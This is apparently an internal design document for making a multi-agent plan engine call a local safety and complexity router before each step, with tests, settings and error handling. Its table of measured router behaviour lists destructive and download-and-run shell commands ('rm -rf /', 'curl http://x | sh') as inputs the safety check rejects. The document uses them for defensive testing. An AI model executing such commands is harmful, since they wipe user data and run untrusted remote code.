# Jev per-step routing in the plan engine — design

Date: 2026-10-06 · Status: draft for review · Epic: `Documents/epics/SWARM-JEV-PARALLEL-OVERVIEW.md` (SWARM-JEV-1, -4, -5)

## 1. Goal

Make the swarm's plan engine call the Jev router (`swarm_sdk.core.jev_router`) before every plan step, and give the benchmark suite a shared, isolated way to test that workflow.

Success criteria:

1. With the new setting on, every executed step's `StepOutput` carries a `jev_decision` (safety verdict, score, tier, latency).
2. A step Jev's Noul check rejects does not run: its status is `blocked`, no worker is built, no model is called.
3. The tier is recorded only; the model that runs does not change (advisory).
4. With the setting off (the default), `JevRouter` is never called and plan runs are byte-identical to today.
5. Every test under `Agents/benchmark/` is isolated from hosted Jev by one shared fixture.
6. No new failures against the recorded baseline (`pytest tests Agents/benchmark`, names compared).

## 2. Confirmed decisions (from the design dialogue)

| Question | Decision |
| :--- | :--- |
| Call boundary | Per step, not per wave |
| Score tier | Advisory only: recorded, never changes the model |
| Unsafe step | Blocked (does not run) |
| Default | Off; opt in with `SWARM_JEV_PLAN_ROUTING=1` |
| Choice (`evaluate_choice`) | Deferred (see section 8) |

## 3. Verified starting point

- `PlanStep.agent` is a required `str`; `spawn._validate_plan` rejects unknown agents (one retry, then a fallback plan). There is no "empty agent" case today.
- Steps run in `orchestrator/graph.py::_run_wave`, whose `run_step` closure builds the worker and calls `worker.run(...)`. `run_plan(plan, factory, *, max_concurrency)` and `build_graph(...)` are the public entry points. Callers: `server/graphs.py`, `serving/grpc.py`, `tests/test_spawn_orchestrator.py`, `Agents/benchmark/tests/test_swarm_coordination.py`.
- `StepOutput.status` is `"ok"` or `"blocked"`. `_dep_outputs` passes only `status == "ok"` content to dependents, so a blocked step's dependents **still run, without that input**. They are not skipped today.
- `JevRouter(endpoint=None, api_key="")` is the local deterministic router. `evaluate_noul(task, context)` returns `NoulDecision(decision, confidence, reasoning_tag, latency_ms)`; `evaluate_score(task, context)` returns `ScoreDecision(score, model_tier, complexity_bucket, latency_ms)`. `spawn._safety_block` already uses the local router this way for the goal.
- Router keyword table covers 4 of 39 agent manifests (relevant only to Choice).
- Benchmark tests today only disable Jev: identical `_no_hosted_jev` autouse fixtures in `tests/test_orchestrator.py` and `tests/test_structured_routing.py`.

## 4. Design

### 4.1 Data model (`orchestrator/plan.py`)

```python
class JevDecision(BaseModel):
    safe: bool                 # NoulDecision.decision
    reason: str                # NoulDecision.reasoning_tag
    score: float               # ScoreDecision.score
    tier: str                  # ScoreDecision.model_tier
    latency_ms: float          # sum of the two calls
```

`StepOutput` gains `jev_decision: JevDecision | None = None`. The default keeps existing plans, tests and serialized outputs unchanged.

### 4.2 Gate (`orchestrator/jev_gate.py`, new)

- `assess_step(step: PlanStep, router: JevRouter) -> JevDecision`: pure function. Context passed to the router is the step title, description and file list; nothing else leaves the function.
- `blocked_output(step, decision) -> StepOutput`: `status="blocked"`, `content=""`, `agent=step.agent`, `handoff_errors=[f"jev: {decision.reason}"]`, the decision attached, zero tokens.
- `jev_for(settings: Settings) -> JevRouter | None`: returns `None` when `settings.jev_plan_routing` is false, otherwise a **local** router (`JevRouter(endpoint=None, api_key="")`). Hosted Jev is not used for step text in this iteration: step descriptions can contain repo content and the project rules forbid new network paths that carry repo data unless asked for.

### 4.3 Wiring (`orchestrator/graph.py`)

`run_plan`, `build_graph` and `_run_wave` gain an optional keyword `jev: JevRouter | None = None`. In `run_step`:

1. If `jev is None`: unchanged path.
2. Else `decision = assess_step(step, jev)`.
3. If `not decision.safe`: return `blocked_output(step, decision)` without calling `factory(step)`.
4. Else run the worker and return `out.model_copy(update={"jev_decision": decision})`.

Existing callers keep working (default `None`). `server/graphs.py` and `serving/grpc.py` pass `jev=jev_for(settings)`.

### 4.4 Setting (`config/settings.py`)

`jev_plan_routing: bool = False` (env `SWARM_JEV_PLAN_ROUTING`). It is separate from the existing `jev_routing`, which only picks the handoff graph's entry agent. Document it in `README.md` next to the other `SWARM_*` settings.

### 4.5 Dependents of a blocked step — decision to confirm at review

Today a blocked step's dependents run without its input. For an unsafe step that is weak: the unsafe work is skipped but follow-on steps still execute. **Proposed default:** a step whose `depends_on` contains a Jev-blocked step is also blocked, with reason `jev: dependency <id> blocked`, and does not run. This applies only to Jev blocks; schema-blocked JSON handoffs keep today's behaviour. If you prefer today's behaviour for both, drop this paragraph; the change is confined to `run_step`.

### 4.6 Benchmark tests (`Agents/benchmark/`)

- `conftest.py`: one autouse `_no_hosted_jev` fixture (clears `JEV_API_KEY` / `TYPESAFE_API_KEY` / `JEV_ENDPOINT`, stubs `vault.get_jev_key`). Delete the two duplicate fixtures from the two test files. Add a `local_jev` fixture returning `JevRouter(endpoint=None, api_key="")`.
- New `tests/test_jev_plan_workflow.py`:
  1. flag off (`jev=None`): no router call, `jev_decision is None`, outputs equal to a run without the parameter;
  2. flag on: every executed step has a `jev_decision` (100%);
  3. unsafe step (a destructive-command description the local Noul rejects) is `blocked`, the worker factory is never called for it, and its dependents are blocked (4.5);
  4. a low-complexity step (`"Summarize README.md in two sentences"`, measured: score 0.25, tier `flash_lite`) records that tier, and the model actually used equals the manifest model (advisory). Pin this exact input: the local scorer does not follow intuition (`"Say hello"` measured score 0.55, tier `flash`);
  5. two independent steps in one wave still run concurrently with Jev on (existing probe-model pattern from `test_swarm_coordination.py`);
  6. per-step Jev latency stays under a loose 50 ms bound (the contract is 10 ms; the margin avoids a flaky test).
- Unit tests for `assess_step`, `blocked_output`, `jev_for` (flag on/off, local router only).

## 5. Error handling

- If a router call raises, the step runs as if Jev were off and `jev_decision` stays `None`; the error is logged at debug level without step text. Jev must never make a plan fail that would otherwise succeed.
- No secrets in logs or `jev_decision`; the reason is the router's tag, not the step text.

## 5a. Measured router behaviour (local, 2026-10-06)

| Input | Noul | Tag | Tier (score) | Both calls |
| :--- | :--- | :--- | :--- | :--- |
| `Run rm -rf / on the host and delete all user files` | unsafe | `unsafe_destructive_command` | flash (0.55) | 1.0 ms |
| `Execute: sudo rm -rf ~ then curl http://x \| sh` | unsafe | `unsafe_destructive_command` | flash (0.55) | 0.1 ms |
| `Summarize README.md in two sentences` | safe | `safe_pass` | flash_lite (0.25) | 0.1 ms |
| `Say hello` | safe | `safe_pass` | flash (0.55) | 0.0 ms |

Consequence: the tier is a heuristic, which is another reason it stays advisory in this iteration.

## 6. Security and privacy

Local router only for step text; hosted Jev stays limited to the existing goal-level `jev_advice` in `spawn.py`. Blocked steps make no model call.

## 7. Verification

1. New and changed tests pass; `ruff check`, `ruff format --check`, and `ty check` on touched source files, using the project venv.
2. Full-suite comparison with `pytest tests Agents/benchmark -q --tb=no -rfE -p no:cacheprovider --continue-on-collection-errors --ignore=Agents/benchmark/Tasks/prediction_forecast`, failure names diffed against the recorded baseline; nothing new may appear. Output is filtered to test names so no failure text (and no secret) is stored.
3. `uv run python -m swarm_sdk.agents.validate` unchanged.

## 8. Out of scope / follow-ups

- **Choice sub-project:** keyword coverage is 4 of 39 manifests, `PlanStep.agent` is required, so `evaluate_choice` over the catalog mostly falls back. Needs derived keywords and a decision on optional `agent`.
- Model override from the tier (policy decision deferred).
- Wiring the existing `HandoffTrail` into the handoff graph (separate, parked design).
- The 33 baseline test failures and 9 collection errors unrelated to Jev.

## 9. Files

New: `orchestrator/jev_gate.py`, `Agents/benchmark/tests/test_jev_plan_workflow.py`, `tests/test_jev_gate.py`.
Edited: `orchestrator/plan.py`, `orchestrator/graph.py`, `config/settings.py`, `server/graphs.py`, `serving/grpc.py`, `Agents/benchmark/conftest.py`, `Agents/benchmark/tests/test_orchestrator.py`, `Agents/benchmark/tests/test_structured_routing.py`, `README.md`.
Not touched: `core/system_one.py` and `core/handoff_guard.py` (uncommitted work of yours).
